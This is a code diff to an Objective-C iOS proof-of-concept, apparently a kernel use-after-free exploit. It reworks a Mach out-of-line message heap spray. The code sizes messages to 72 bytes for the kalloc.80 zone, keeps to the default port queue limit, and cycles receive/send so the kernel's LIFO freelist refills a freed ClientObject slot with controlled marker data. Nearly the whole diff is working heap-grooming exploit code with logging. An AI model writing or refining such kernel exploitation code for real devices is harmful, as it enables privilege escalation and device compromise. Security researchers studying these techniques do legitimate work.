@@ -3519,30 +3519,32 @@ static const char kOpenPropertiesGarbage[] =
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning complete (%d cycles x %d conns = %d ClientObject alloc/release pairs). closeErrors=%u openErrors=%u",
                      kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];
 
-    // ---- Mach OOL spray setup (persistent kalloc.80 objects) ----
-    // Out-of-line (OOL) data sent via mach_msg is copied to kalloc by the kernel.
-    // 72-byte OOL payload → kalloc.80 zone. Messages are held in a local port queue
-    // (not received) so the kernel buffers persist. Each send/receive cycle in the
-    // spray thread continually allocs/frees one kalloc.80 slot — when conn[0]'s
-    // ClientObject is freed, the next send's LIFO allocation reclaims that exact slot.
-    // No special entitlements needed: mach_msg is available to all iOS processes.
+    // ---- Mach OOL spray setup (kalloc.80 reclaim) ----
+    // Kernel copies each sent message to a buffer in the port queue, allocated from
+    // kalloc at msgh_size bytes. We pad OOLMsg to 72 bytes so messages land in the
+    // kalloc.80 zone (65-80 bytes) — same zone as ClientObject (~72 bytes).
+    // The spray thread cycles recv→send: each recv frees a kalloc.80 slot, each send
+    // allocates a new one. kalloc's LIFO freelist means the send right after
+    // ClientObject is freed reclaims that exact slot, now filled with our markers.
     typedef struct {
-        mach_msg_header_t header;
-        mach_msg_body_t body;
-        mach_msg_ool_descriptor_t ool;
+        mach_msg_header_t header;        // 24 bytes
+        mach_msg_body_t body;            //  4 bytes
+        mach_msg_ool_descriptor_t ool;   // 28 bytes
+        uint64_t _pad[2];                // 16 bytes → total 72B → kalloc.80
     } OOLMsg;
+
+    // Mach port default queue limit is 5. We pre-fill exactly 5 messages to stay
+    // within the limit WITHOUT needing mach_port_set_attributes (which may be
+    // restricted on iOS). The spray thread then cycles these 5 messages rapidly.
+    enum { kSprayQueueDepth = 5 };
 
     mach_port_t sprayPort = MACH_PORT_NULL;
     __block int sprayReady = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) == KERN_SUCCESS) {
         mach_port_insert_right(mach_task_self_, sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
-        // Default port queue limit is 5 — bump it so the pre-fill doesn't block
-        // MACH_PORT_QLIMIT=0x04 (not in iOS SDK headers, use numeric value)
-        mach_port_msgcount_t qlimit = (mach_port_msgcount_t)(kOolMsgCount + 10);
-        mach_port_set_attributes(mach_task_self_, sprayPort, 4,
-            (mach_port_info_t)&qlimit, sizeof(qlimit));
         sprayReady = 1;
     }
+    [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];
 
     // Need heap payload so block capture is valid (stack buffer would go out of scope)
     uint8_t *sprayPayload = NULL;
@@ -3555,9 +3557,10 @@ static const char kOpenPropertiesGarbage[] =
             *(uint64_t *)(sprayPayload + 16) = 0xBADC0FFEE0DDF00DULL;
             *(uint64_t *)(sprayPayload + 32) = 0xDEADBEEFDEADBEEFULL;
 
-            // Pre-fill: send messages to fill kalloc.80 freelist with our data
+            // Pre-fill: kSprayQueueDepth messages (fits default Mach port queue limit).
+            // Each send copies the 72-byte OOLMsg to kalloc.80 in the port queue.
             int sent = 0;
-            for (int i = 0; i < kOolMsgCount; i++) {
+            for (int i = 0; i < kSprayQueueDepth; i++) {
                 OOLMsg msg;
                 memset(&msg, 0, sizeof(msg));
                 msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -3574,7 +3577,7 @@ static const char kOpenPropertiesGarbage[] =
                     sent++;
                 }
             }
-            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs sent, kalloc.80 pre-filled", sent, kOolMsgCount]];
+            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs pre-filled (OOLMsg=%zuB → kalloc.80)", sent, kSprayQueueDepth, sizeof(OOLMsg)]];
             if (sent == 0) sprayReady = 0;
         } else {
             sprayReady = 0;
@@ -3593,10 +3596,10 @@ static const char kOpenPropertiesGarbage[] =
     dispatch_group_t group = dispatch_group_create();
 
     // ---- Mach OOL spray thread — kalloc.80 alloc/free cycling ----
-    // Receive one pending message (frees one kalloc.80 OOL copy), then re-send
-    // (allocates a new 72-byte OOL copy from kalloc.80's freelist). The freelist
-    // is LIFO, so if conn[0]'s ClientObject was just freed, this send reclaims
-    // that exact slot with our controlled data.
+    // For each cycle: recv (frees queued message → kalloc.80 slot returned to
+    // freelist), then send (kernel copies message → new kalloc.80 allocation).
+    // kalloc is LIFO, so if conn[0]'s ClientObject was just freed during this
+    // cycle, the send's allocation reclaims that exact slot with our markers.
     dispatch_queue_t sprayQueue = NULL;
     if (sprayReady) {
         sprayQueue = dispatch_queue_create("com.testpoc.lifecycle.spray",
@@ -3604,7 +3607,7 @@ static const char kOpenPropertiesGarbage[] =
         dispatch_group_enter(group);
         dispatch_async(sprayQueue, ^{
             while (atomic_load(&stopFlag) == 0) {
-                // Receive one msg → frees one OOL copy from kalloc.80
+                // Receive one msg → frees one kalloc.80 slot (message buffer released)
                 OOLMsg rcvMsg;
                 rcvMsg.header.msgh_local_port = sprayPort;
                 rcvMsg.header.msgh_size = sizeof(OOLMsg);
@@ -4092,7 +4095,7 @@ static const char kOpenPropertiesGarbage[] =
     {
         if (sprayReady) {
             [self appendLog:[NSString stringWithFormat:
-                @"  Mach OOL spray active: %d msgs cycling kalloc.80", kOolMsgCount]];
+                @"  Mach OOL spray active: %d msgs cycling kalloc.80", kSprayQueueDepth]];
         } else {
             [self appendLog:@"  Mach OOL spray NOT available — no kalloc.80 pressure applied"];
         }
@@ -4447,7 +4450,7 @@ static const char kOpenPropertiesGarbage[] =
         finalCloseErrs, finalOpenErrs, finalLifecycleIters]];
     [self appendLog:[NSString stringWithFormat:
         @"  Spray: %@ (%d msgs, kalloc.80 Mach OOL cycling)",
-        sprayReady ? @"ACTIVE" : @"OFF", kOolMsgCount]];
+        sprayReady ? @"ACTIVE" : @"OFF", kSprayQueueDepth]];
     [self appendLog:[NSString stringWithFormat:
         @"  Churn errors: close=%d open=%d (of %d cycles)",
         finalChurnCloseErrs, finalChurnOpenErrs, finalChurnIters]];
